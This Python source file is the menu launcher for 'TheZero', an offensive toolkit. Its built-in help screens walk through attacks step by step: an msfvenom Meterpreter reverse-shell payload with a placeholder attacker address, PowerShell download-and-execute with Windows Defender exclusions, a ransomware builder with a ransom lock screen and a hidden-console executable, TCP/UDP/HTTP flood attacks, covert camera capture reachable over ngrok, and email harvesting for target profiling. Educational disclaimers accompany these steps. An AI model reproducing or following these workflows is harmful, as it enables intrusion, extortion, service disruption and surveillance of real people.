#!/usr/bin/env python3

import os
import sys
import subprocess
import time

RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

def check_and_activate_venv():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    venv_path = os.path.join(script_dir, 'venv')
    venv_python = os.path.join(venv_path, 'bin', 'python3')

    if not os.path.exists(venv_path):
        print(f"{RED}Error: Virtual environment not found!{RESET}")
        print(f"{YELLOW}Please run Setup.sh first:{RESET}")
        print(f"  {CYAN}./Setup.sh{RESET}\n")
        sys.exit(1)

    if sys.prefix == sys.base_prefix:
        print(f"{CYAN}Activating virtual environment...{RESET}\n")
        os.execv(venv_python, [venv_python] + sys.argv)

    return venv_python

BANNER = f"""{GREEN}
████████╗██╗  ██╗███████╗███████╗███████╗██████╗  ██████╗
╚══██╔══╝██║  ██║██╔════╝╚══███╔╝██╔════╝██╔══██╗██╔═══██╗
   ██║   ███████║█████╗    ███╔╝ █████╗  ██████╔╝██║   ██║
   ██║   ██╔══██║██╔══╝   ███╔╝  ██╔══╝  ██╔══██╗██║   ██║
   ██║   ██║  ██║███████╗███████╗███████╗██║  ██║╚██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}
{YELLOW}    Professional Penetration Testing & Security Suite{RESET}
{MAGENTA}           Developed by b1l4l-sec | Version 2.4{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}
"""

def clear():
    os.system('clear')

def print_menu():
    print(f"""
{BOLD}{CYAN}┌─────────────────────────────────────────────────────────┐
│                    MAIN CONTROL PANEL                   │
└─────────────────────────────────────────────────────────┘{RESET}

  {GREEN}[1]{RESET} {BOLD}Crypto & Port Scanner Suite{RESET}
      └─ Base64/32 Encoding, Caesar Cipher, Port Scanner, Password Gen

  {GREEN}[2]{RESET} {BOLD}SpecterVision Surveillance{RESET}
      └─ Camera Capture, Emotion Detection, Motion Analysis

  {GREEN}[3]{RESET} {BOLD}Social Engineering Framework{RESET}
      └─ OSINT, Email Harvesting, Target Profiling, Intelligence

  {GREEN}[4]{RESET} {BOLD}Deploy MASTER Lock{RESET}
      └─ Ransomware, Payload Generator, Educational Tool

  {GREEN}[5]{RESET} {BOLD}HackWIN Payload Generator{RESET}
      └─ Windows Payload Generation, Listener Setup, Educational Tool

  {GREEN}[6]{RESET} {BOLD}DoDOS Stress Testing{RESET}
      └─ TCP/UDP/HTTP Flood, Network Resilience Testing

  {GREEN}[7]{RESET} {BOLD}Password Manager{RESET}
      └─ Encrypted Password Storage, Master Password Protection

  {YELLOW}[8]{RESET} {BOLD}View Documentation{RESET}
      └─ Help & Usage Guides

  {RED}[0]{RESET} {BOLD}Exit TheZero{RESET}

{CYAN}═══════════════════════════════════════════════════════════{RESET}
""")

def show_crypto_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{GREEN}CRYPTO & PORT SCANNER SUITE - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}Available Tools:{RESET}

{GREEN}1. Port Scanner{RESET}
   - Scans all 65,535 ports on target IP/hostname
   - Multi-threaded for fast scanning
   - Usage: Enter target IP or domain name
   - Example: 192.168.1.1 or scanme.nmap.org

{GREEN}2. Cryptography x64{RESET}
   - Base64 Encoding/Decoding
   - Base32 Encoding/Decoding
   - Usage: Select encode/decode and paste your data

{GREEN}3. Caesar Cipher{RESET}
   - Classical shift cipher
   - Encode/Decode messages with custom shift values
   - Usage: Enter message and shift number (1-25)

{GREEN}4. Password Generator{RESET}
   - Generate strong random passwords
   - Customizable length and character types
   - Usage: Specify letters, numbers, and symbols count

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{YELLOW}Note: Always obtain proper authorization before scanning networks{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_specter_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{GREEN}SPECTERVISION SURVEILLANCE - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. Automated Camera Capture{RESET}
   - Captures frames every 3 seconds automatically
   - Saves to organized session directories
   - Web-based interface for easy access

{GREEN}2. Emotion Detection{RESET}
   - Real-time face detection using TensorFlow.js
   - Analyzes facial expressions
   - Detects: Happy, Sad, Angry, Surprised, Fearful, Disgusted, Neutral

{GREEN}3. Motion Detection{RESET}
   - Pixel-by-pixel frame comparison
   - Highlights movement areas in red overlay
   - Real-time motion percentage indicator

{GREEN}4. Remote Access{RESET}
   - ngrok tunnel integration for remote access
   - Access from anywhere with internet

{BOLD}{YELLOW}Quick Start:{RESET}
   1. Select option [2] from main menu
   2. Choose [1] to launch local server
   3. Browser opens automatically
   4. Click "Initialize Camera"
   5. Enable detection modes as needed

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{YELLOW}Legal Notice: Use only for authorized security testing{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_socialeng_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{GREEN}SOCIAL ENGINEERING FRAMEWORK - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. Email Harvesting{RESET}
   - Extract emails from websites and domains
   - Multi-source aggregation
   - Export to JSON/TXT formats

{GREEN}2. Phone Number Validation{RESET}
   - Validate international phone numbers
   - Format detection and validation
   - Country code identification

{GREEN}3. Username Generation{RESET}
   - Generate potential usernames from names
   - Multiple format patterns
   - Social media username suggestions

{GREEN}4. Target Profiling{RESET}
   - Aggregate information from multiple sources
   - Relationship mapping
   - Profile exporting (JSON/TXT)

{GREEN}5. Social Media Enumeration{RESET}
   - Check username availability across platforms
   - Profile discovery
   - Public information gathering

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{RED}{BOLD}CRITICAL WARNING:{RESET}
{YELLOW}This module is for AUTHORIZED TESTING ONLY.
Always obtain written permission before gathering intelligence.
Unauthorized use may violate laws and regulations.{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_hackwin_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{RED}HACKWIN PAYLOAD GENERATOR - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}What is HackWIN?{RESET}
Educational Windows payload generation framework for CTF challenges and
authorized penetration testing engagements.

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. PowerShell Payload Generation{RESET}
   - Generates download and execute scripts
   - Windows Defender exclusion support
   - URL-based payload delivery
   - Save scripts to file

{GREEN}2. Listener Setup{RESET}
   - Metasploit handler configuration
   - Netcat alternative commands
   - Custom LHOST and LPORT settings

{BOLD}{YELLOW}Typical Workflow:{RESET}

{CYAN}Step 1: Create Payload{RESET}
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP \\
  LPORT=4444 -f exe -o payload.exe

{CYAN}Step 2: Host Payload{RESET}
  python3 -m http.server 9090

{CYAN}Step 3: Generate PowerShell Script{RESET}
  Use HackWIN option [1]
  Provide your hosted payload URL

{CYAN}Step 4: Execute on Target{RESET}
  Run PowerShell script on authorized target machine

{CYAN}Step 5: Start Listener{RESET}
  Use HackWIN option [2] or Metasploit console

{CYAN}Step 6: Gain Shell Access{RESET}
  Receive reverse shell connection

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{RED}{BOLD}CRITICAL DISCLAIMER:{RESET}
{YELLOW}This tool is for AUTHORIZED TESTING AND EDUCATIONAL USE ONLY
- Ensure proper written authorization before use
- Unauthorized access to computer systems is ILLEGAL
- Comply with all applicable laws and regulations
- Use responsibly and ethically{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_dodos_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{CYAN}DODOS STRESS TESTING - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. TCP Flood Attack{RESET}
   - SYN flood for network layer testing
   - Configurable source ports
   - Multi-threaded performance

{GREEN}2. UDP Flood Attack{RESET}
   - Connectionless packet flooding
   - Customizable packet size (64-65507 bytes)
   - High-speed transmission

{GREEN}3. HTTP Request Flood{RESET}
   - Application layer stress testing
   - Multiple user-agent rotation
   - Realistic browser simulation

{GREEN}4. Real-time Statistics{RESET}
   - Live packet/request counter
   - Elapsed time tracking
   - Average rate calculation

{BOLD}{YELLOW}Quick Start:{RESET}
   1. Select option [5] from main menu
   2. Confirm authorization
   3. Choose attack type
   4. Configure parameters (target, port, threads, duration)
   5. Monitor real-time statistics

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{RED}{BOLD}CRITICAL WARNING:{RESET}
{YELLOW}This tool is for AUTHORIZED STRESS TESTING ONLY.
Requires written permission from target system owner.
Unauthorized DoS attacks are ILLEGAL and prosecutable.
Use only in CTF competitions and authorized environments.{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_password_manager_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{GREEN}PASSWORD MANAGER - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. Military-Grade Encryption{RESET}
   - AES-256 encryption via Fernet
   - PBKDF2 key derivation (100,000 iterations)
   - Master password protection
   - Encrypted vault storage

{GREEN}2. Password Operations{RESET}
   - Add new passwords for services
   - Retrieve stored passwords
   - List all stored entries
   - Delete unwanted entries

{GREEN}3. Security Features{RESET}
   - Master password required for access
   - All data encrypted at rest
   - 3-attempt authentication limit
   - No plaintext storage

{BOLD}{YELLOW}Quick Start:{RESET}
   1. Select option [7] from main menu
   2. Create master password (first time only)
   3. Add passwords for your services
   4. Retrieve passwords when needed

{BOLD}{YELLOW}Important Notes:{RESET}
   - Master password CANNOT be recovered if lost
   - Keep master password secure and memorable
   - All passwords encrypted with your master password
   - Vault stored in: PasswordManager/vault/

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{YELLOW}Security Best Practice: Use a strong, unique master password
Never share your master password with anyone{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def show_masterlock_help():
    clear()
    print(BANNER)
    print(f"""
{BOLD}{RED}MASTER LOCK RANSOMWARE SIMULATOR - DOCUMENTATION{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

{BOLD}{YELLOW}What is MASTER Lock?{RESET}
Educational ransomware simulation for CTF challenges and security training.
Demonstrates encryption techniques used in real ransomware for defensive research.

{BOLD}{YELLOW}Features:{RESET}

{GREEN}1. Symmetric Encryption{RESET}
   - Fernet (AES-128 CBC mode)
   - Cryptographically secure key generation
   - Recursive file encryption

{GREEN}2. Full-Screen Lock GUI{RESET}
   - Matrix-style interface (black/green)
   - Custom ransom message
   - Key verification system
   - Automatic decryption

{GREEN}3. Windows Executable{RESET}
   - PyInstaller compilation
   - No console window
   - Standalone operation

{GREEN}4. Safety Features{RESET}
   - Placeholder target directory
   - Local key storage (secret.key)
   - Full file recovery
   - No network communication

{BOLD}{YELLOW}Typical Workflow:{RESET}

{CYAN}Step 1: Generate Payload{RESET}
  Select option [4] - Deploy MASTER Lock
  Select [1] - Deploy MASTER Lock
  Provide contact information

{CYAN}Step 2: Build Executable{RESET}
  Select [2] - Build Windows Executable
  Wait for PyInstaller compilation

{CYAN}Step 3: Deploy in CTF Lab{RESET}
  Transfer MASTERLock.exe to test system
  Create C:\\CTF_Challenge\\VictimFiles
  Add dummy files for encryption

{CYAN}Step 4: Execute Payload{RESET}
  Run MASTERLock.exe on target
  Files encrypt automatically
  Lock screen displays

{CYAN}Step 5: Recovery{RESET}
  Enter key from secret.key file
  Click "Verify Key"
  Files decrypt automatically

{CYAN}═══════════════════════════════════════════════════════════{RESET}
{RED}{BOLD}CRITICAL DISCLAIMER:{RESET}
{YELLOW}This tool is for AUTHORIZED CTF AND EDUCATIONAL USE ONLY
- Requires explicit written authorization
- Only deploy in isolated lab environments
- Default target: C:\\CTF_Challenge\\VictimFiles
- Unauthorized use is ILLEGAL and prosecutable
- Use responsibly and ethically{RESET}
""")
    input(f"\n{BOLD}Press Enter to continue...{RESET}")

def launch_crypto_suite(venv_python):
    clear()
    crypto_path = os.path.join(os.path.dirname(__file__), 'Crypto&portScan', 'thezero.py')
    if os.path.exists(crypto_path):
        try:
            subprocess.run([venv_python, crypto_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: Crypto suite not found at {crypto_path}{RESET}")
        time.sleep(2)

def launch_spectervision(venv_python):
    clear()
    specter_path = os.path.join(os.path.dirname(__file__), 'SpecterVision', 'spectervision.py')
    if os.path.exists(specter_path):
        try:
            subprocess.run([venv_python, specter_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: SpecterVision not found at {specter_path}{RESET}")
        time.sleep(2)

def launch_socialeng(venv_python):
    clear()
    socialeng_path = os.path.join(os.path.dirname(__file__), 'SocialEng', 'socialeng.py')
    if os.path.exists(socialeng_path):
        try:
            subprocess.run([venv_python, socialeng_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: SocialEng framework not found at {socialeng_path}{RESET}")
        time.sleep(2)

def launch_hackwin(venv_python):
    clear()
    hackwin_path = os.path.join(os.path.dirname(__file__), 'HackWIN', 'hackwin.py')
    if os.path.exists(hackwin_path):
        try:
            subprocess.run([venv_python, hackwin_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: HackWIN not found at {hackwin_path}{RESET}")
        time.sleep(2)

def launch_dodos(venv_python):
    clear()
    dodos_path = os.path.join(os.path.dirname(__file__), 'DoDOS', 'dodos.py')
    if os.path.exists(dodos_path):
        try:
            subprocess.run([venv_python, dodos_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: DoDOS not found at {dodos_path}{RESET}")
        time.sleep(2)

def launch_password_manager(venv_python):
    clear()
    pwmgr_path = os.path.join(os.path.dirname(__file__), 'PasswordManager', 'password_manager.py')
    if os.path.exists(pwmgr_path):
        try:
            subprocess.run([venv_python, pwmgr_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: Password Manager not found at {pwmgr_path}{RESET}")
        time.sleep(2)

def launch_masterlock(venv_python):
    clear()
    masterlock_path = os.path.join(os.path.dirname(__file__), 'MASTERLock', 'masterlock.py')
    if os.path.exists(masterlock_path):
        try:
            subprocess.run([venv_python, masterlock_path])
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Returning to main menu...{RESET}")
            time.sleep(1)
    else:
        print(f"{RED}Error: MASTER Lock not found at {masterlock_path}{RESET}")
        time.sleep(2)

def main():
    venv_python = check_and_activate_venv()

    while True:
        clear()
        print(BANNER)
        print_menu()

        try:
            choice = input(f"{BOLD}{CYAN}TheZero{RESET} > ").strip()

            if choice == '1':
                launch_crypto_suite(venv_python)
            elif choice == '2':
                launch_spectervision(venv_python)
            elif choice == '3':
                launch_socialeng(venv_python)
            elif choice == '4':
                launch_masterlock(venv_python)
            elif choice == '5':
                launch_hackwin(venv_python)
            elif choice == '6':
                launch_dodos(venv_python)
            elif choice == '7':
                launch_password_manager(venv_python)
            elif choice == '8':
                while True:
                    try:
                        clear()
                        print(BANNER)
                        print(f"""
{BOLD}{YELLOW}DOCUMENTATION MENU{RESET}
{CYAN}═══════════════════════════════════════════════════════════{RESET}

  {GREEN}[1]{RESET} Crypto & Port Scanner Help
  {GREEN}[2]{RESET} SpecterVision Help
  {GREEN}[3]{RESET} Social Engineering Help
  {GREEN}[4]{RESET} MASTER Lock Help
  {GREEN}[5]{RESET} HackWIN Help
  {GREEN}[6]{RESET} DoDOS Help
  {GREEN}[7]{RESET} Password Manager Help
  {RED}[0]{RESET} Back to Main Menu

{CYAN}═══════════════════════════════════════════════════════════{RESET}
""")
                        doc_choice = input(f"{BOLD}{CYAN}Help{RESET} > ").strip()
                        if doc_choice == '1':
                            show_crypto_help()
                        elif doc_choice == '2':
                            show_specter_help()
                        elif doc_choice == '3':
                            show_socialeng_help()
                        elif doc_choice == '4':
                            show_masterlock_help()
                        elif doc_choice == '5':
                            show_hackwin_help()
                        elif doc_choice == '6':
                            show_dodos_help()
                        elif doc_choice == '7':
                            show_password_manager_help()
                        elif doc_choice == '0':
                            break
                        else:
                            print(f"{RED}Invalid option{RESET}")
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print(f"\n{YELLOW}Returning to main menu...{RESET}")
                        time.sleep(1)
                        break
            elif choice == '0':
                clear()
                print(BANNER)
                print(f"\n{BOLD}{GREEN}Thank you for using TheZero!{RESET}")
                print(f"{CYAN}Stay secure, stay ethical.{RESET}\n")
                sys.exit(0)
            else:
                print(f"{RED}Invalid option. Please select 0-8.{RESET}")
                time.sleep(1)

        except KeyboardInterrupt:
            print(f"\n\n{YELLOW}Interrupted by user{RESET}")
            print(f"{BOLD}{GREEN}Goodbye!{RESET}\n")
            sys.exit(0)
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")
            time.sleep(2)

if __name__ == '__main__':
    main()
